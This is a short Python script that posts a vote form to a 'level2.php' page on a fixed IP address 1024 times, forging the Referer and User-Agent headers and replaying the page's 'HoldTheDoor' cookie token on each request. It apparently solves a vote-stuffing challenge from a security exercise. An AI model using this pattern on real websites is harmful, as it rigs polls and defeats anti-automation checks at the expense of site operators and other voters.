#!/usr/bin/python3
import requests


l1url = 'http://158.69.76.135/level2.php'
headers = {
    'Referer': 'http://158.69.76.135/level2.php',
    'User-Agent': 'Mozilla/4.01 [en] (Win95; I)'
}

r = requests.get(l1url, headers=headers)
for i in range(1024):
    r = requests.post(
        l1url,
        data={
            'id': '390',
            'holdthedoor': 'Submit',
            'key': r.cookies['HoldTheDoor']
        },
        cookies=r.cookies,
        headers=headers
    )
